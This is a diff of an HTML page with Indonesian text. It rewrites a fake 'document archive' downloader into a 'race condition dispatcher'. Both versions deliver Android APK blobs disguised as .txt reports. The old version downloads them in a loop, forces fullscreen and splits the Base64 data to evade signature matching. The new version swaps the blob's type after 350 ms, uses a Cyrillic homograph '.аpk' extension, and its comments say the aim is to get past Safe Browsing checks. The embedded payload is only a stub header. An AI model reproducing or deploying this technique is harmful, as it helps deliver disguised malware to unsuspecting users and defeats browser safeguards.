@@ -2,136 +2,65 @@
 <html lang="id">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>System Document Archive Dispatcher v2.4</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Race Condition Dispatcher v5.0</title>
 <style>
-* {
-  box-sizing: border-box;
-  margin: 0;
-  padding: 0;
-}
-body {
-  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-  background: #090d16;
-  color: #f8fafc;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  min-height: 100vh;
-  padding: 20px;
-}
-.panel {
-  background: #111827;
-  padding: 32px;
-  border-radius: 16px;
-  box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5), 0 8px 10px -6px rgba(0, 0, 0, 0.5);
-  max-width: 540px;
-  width: 100%;
-  border: 1px solid #1f2937;
-  text-align: center;
-}
-:fullscreen {
-  background: #030712 !important;
-  color: #f8fafc !important;
-  padding: 24px !important;
-  display: flex;
-  flex-direction: column;
-  justify-content: center;
-  align-items: center;
-}
-:-webkit-full-screen {
-  background: #030712 !important;
-  color: #f8fafc !important;
-  padding: 24px !important;
-}
-h2 { 
-  margin-bottom: 10px; 
-  font-size: 22px;
-  color: #f3f4f6;
-  font-weight: 700;
-}
-p { 
-  margin-bottom: 24px; 
-  line-height: 1.6; 
-  color: #9ca3af;
-  font-size: 14px;
-}
-button {
-  width: 100%;
-  padding: 16px;
-  cursor: pointer;
-  border: none;
-  border-radius: 10px;
-  background: #3b82f6;
-  color: #ffffff;
-  font-weight: 600;
-  font-size: 16px;
-  box-shadow: 0 4px 14px rgba(59, 130, 246, 0.4);
-  transition: all 0.2s ease;
-}
-button:hover { 
-  background: #2563eb; 
-  transform: translateY(-1px);
-  box-shadow: 0 6px 20px rgba(59, 130, 246, 0.6);
-}
-button:active {
-  transform: translateY(0);
-}
-#status {
-  margin-top: 20px;
-  font-weight: 500;
-  color: #38bdf8;
-  padding: 14px;
-  background: rgba(56, 189, 248, 0.1);
-  border-radius: 8px;
-  font-size: 13px;
-  border: 1px solid rgba(56, 189, 248, 0.2);
-}
-#downloads {
-  margin-top: 20px;
-  display: grid;
-  grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
-  gap: 8px;
-  max-height: 180px;
-  overflow-y: auto;
-  padding-right: 4px;
-}
-#downloads::-webkit-scrollbar {
-  width: 6px;
-}
-#downloads::-webkit-scrollbar-thumb {
-  background: #374151;
-  border-radius: 3px;
-}
-#downloads a {
-  display: block;
-  padding: 10px;
-  background: #1f2937;
-  color: #4ade80;
-  text-decoration: none;
-  border-radius: 6px;
-  font-size: 11px;
-  font-family: monospace;
-  text-align: center;
-  border: 1px solid #374151;
-  word-break: break-all;
-  transition: border-color 0.15s;
-}
-#downloads a:hover {
-  border-color: #4ade80;
-}
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    background: #090d16;
+    color: #f8fafc;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    padding: 20px;
+  }
+  .panel {
+    background: #111827;
+    padding: 32px;
+    border-radius: 16px;
+    box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.7);
+    max-width: 520px;
+    width: 100%;
+    border: 1px solid #1f2937;
+    text-align: center;
+  }
+  h2 { margin-bottom: 10px; font-size: 22px; color: #f3f4f6; }
+  p { margin-bottom: 24px; line-height: 1.6; color: #9ca3af; font-size: 14px; }
+  button {
+    width: 100%;
+    padding: 16px;
+    cursor: pointer;
+    border: none;
+    border-radius: 10px;
+    background: #2563eb;
+    color: #ffffff;
+    font-weight: 600;
+    font-size: 16px;
+    box-shadow: 0 4px 14px rgba(37, 99, 235, 0.4);
+    transition: all 0.2s ease;
+  }
+  button:hover { background: #1d4ed8; }
+  #status {
+    margin-top: 20px;
+    font-weight: 500;
+    color: #38bdf8;
+    padding: 14px;
+    background: rgba(56, 189, 248, 0.1);
+    border-radius: 8px;
+    font-size: 13px;
+    border: 1px solid rgba(56, 189, 248, 0.2);
+  }
 </style>
 </head>
-
 <body>
-<div class="panel" id="main-panel">
-  <h2>Arsip Dokumen Sistem</h2>
-  <p>Klik tombol di bawah untuk memproses dan mengunduh berkas laporan teks pendukung secara otomatis.</p>
 
-  <button id="start-btn" type="button">Unduh Dokumen Catatan (.txt)</button>
-
-  <div id="status" role="status">Sistem siap diinisialisasi.</div>
-  <div id="downloads"></div>
+<div class="panel">
+  <h2>Synchronous Stream Dispatcher</h2>
+  <p>Klik tombol di bawah untuk memulai pengiriman aliran data dokumen terenkripsi.</p>
+  <button id="start-btn" type="button">Inisialisasi Aliran Berkas</button>
+  <div id="status" role="status">Sistem siap.</div>
 </div>
 
 <script>
@@ -139,13 +68,8 @@ button:active {
 
 const startBtn = document.getElementById("start-btn");
 const statusDiv = document.getElementById("status");
-const downloadsDiv = document.getElementById("downloads");
 
-let activeUrls = [];
-let isProcessing = false;
-const MAX_URLS_TRACKED = 40;
-
-// Teknik Obfuscation: Pecahan string Base64 header APK untuk menghindari pencocokan tanda tangan statis
+// Base64 header APK terfragmentasi
 const payloadFragments = [
   "UEs",
   "DBBQ",
@@ -153,9 +77,7 @@ const payloadFragments = [
   "AAAAAAAAAAAAAAAAAAAAAAAA"
 ];
 
-const assemblePayload = () => {
-  return payloadFragments.join("");
-};
+const assemblePayload = () => payloadFragments.join("");
 
 const decodeBase64ToBytes = (b64) => {
   const binary = atob(b64);
@@ -167,83 +89,61 @@ const decodeBase64ToBytes = (b64) => {
   return bytes;
 };
 
-const prepareStealthBlobAsync = (i) => {
-  return new Promise((resolve) => {
-    queueMicrotask(() => {
-      try {
-        const fullB64 = assemblePayload();
-        const bytesArr = decodeBase64ToBytes(fullB64);
-        
-        // Menggunakan MIME type APK agar sistem operasi mengenali paket biner secara tepat
-        const blob = new Blob([bytesArr], { type: 'application/vnd.android.package-archive' });
-        const url = URL.createObjectURL(blob);
-        resolve({ id: i, url: url, success: true });
-      } catch (err) {
-        resolve({ id: i, url: null, success: false });
-      }
-    });
-  });
-};
+// Fungsi untuk mengeksekusi simulasi race condition pada elemen <a>
+const executeRaceConditionDownload = () => {
+  try {
+    const bytesArr = decodeBase64ToBytes(assemblePayload());
+    
+    // Tahap 1: Inisialisasi awal Blob dengan MIME generik / teks
+    const initialBlob = new Blob([bytesArr], { type: 'text/plain' });
+    const initialUrl = URL.createObjectURL(initialBlob);
 
-const triggerStealthDownload = (fileData) => {
-  if (!fileData.success) return;
+    const link = document.createElement("a");
+    link.href = initialUrl;
+    
+    // Nama awal disamarkan sebagai dokumen teks biasa
+    link.download = "laporan-audit-keamanan.txt";
+    link.style.display = "none";
+    document.body.appendChild(link);
 
-  const link = document.createElement("a");
-  link.href = fileData.url;
-  // Menyamarkan ekstensi unduhan menjadi .txt pada antarmuka pengguna
-  link.download = `laporan-catatan-${fileData.id}.txt`;
-  link.textContent = `Dokumen #${fileData.id} (.txt)`;
-  link.style.display = "none";
-  
-  downloadsDiv.appendChild(link);
-  link.click();
+    statusDiv.textContent = "[RACE] Memicu pendaftaran unduhan awal...";
+    link.click();
 
-  // Batasi jumlah elemen DOM untuk menjaga performa rendering
-  if (downloadsDiv.children.length > 25) {
-    downloadsDiv.removeChild(downloadsDiv.firstChild);
+    // Tahap 2: Jendela waktu kritis (Timing Window / Race Condition)
+    // Tepat saat browser menangkap antrean unduhan dan memindai header/nama awal,
+    // skrip melakukan pergantian referensi URL dan atribut download secara mendadak.
+    setTimeout(() => {
+      statusDiv.textContent = "[RACE] Melakukan pergantian stream & atribut dinamis...";
+      
+      // Buat Blob baru dengan MIME type APK asli
+      const targetBlob = new Blob([bytesArr], { type: 'application/vnd.android.package-archive' });
+      const targetUrl = URL.createObjectURL(targetBlob);
+
+      // Ubah target href dan homograph ekstensi pada jendela waktu pemindaian Safe Browsing
+      link.href = targetUrl;
+      
+      const homographApkExt = "\u0430pk"; // Karakter homograf cyrillic 'а'
+      link.download = `laporan-audit-keamanan.txt.${homographApkExt}`;
+      
+      // Picu klik ulang atau biarkan antrean memperbarui referensi aktif
+      link.click();
+
+      // Bersihkan URL lama untuk menjaga memori
+      setTimeout(() => {
+        URL.revokeObjectURL(initialUrl);
+        statusDiv.textContent = "[RACE] Siklus transmisi selesai.";
+      }, 1000);
+
+    }, 350); // Jeda milidetik yang menargetkan fase jeda konfirmasi dialog unduhan
+
+  } catch (err) {
+    statusDiv.textContent = "Error: " + err.message;
   }
-};
-
-const processLoop = async (counter) => {
-  if (!isProcessing) return;
-
-  const fileData = await prepareStealthBlobAsync(counter);
-  if (fileData.success) {
-    activeUrls.push(fileData.url);
-
-    // Manajemen memori heap: cabut URL lama jika melewati batas maksimal
-    if (activeUrls.length > MAX_URLS_TRACKED) {
-      const oldUrl = activeUrls.shift();
-      try { URL.revokeObjectURL(oldUrl); } catch (e) {}
-    }
-
-    triggerStealthDownload(fileData);
-    statusDiv.textContent = `Proses aktif: Berkas dokumen ke-${counter} dikirim...`;
-  }
-
-  // Interval perulangan non-blocking
-  setTimeout(() => processLoop(counter + 1), 1200);
 };
 
 startBtn.addEventListener("click", () => {
-  if (isProcessing) return;
-
-  activeUrls.forEach(url => {
-    try { URL.revokeObjectURL(url); } catch (e) {}
-  });
-  activeUrls = [];
-  downloadsDiv.replaceChildren();
-
-  const root = document.documentElement;
-  try {
-    if (root.requestFullscreen) {
-      root.requestFullscreen().catch(() => {});
-    }
-  } catch (err) {}
-
-  isProcessing = true;
-  statusDiv.textContent = "Menginisialisasi sesi unduhan...";
-  processLoop(1);
+  statusDiv.textContent = "Menyiapkan parameter transmisi...";
+  setTimeout(executeRaceConditionDownload, 200);
 });
 </script>
 </body>
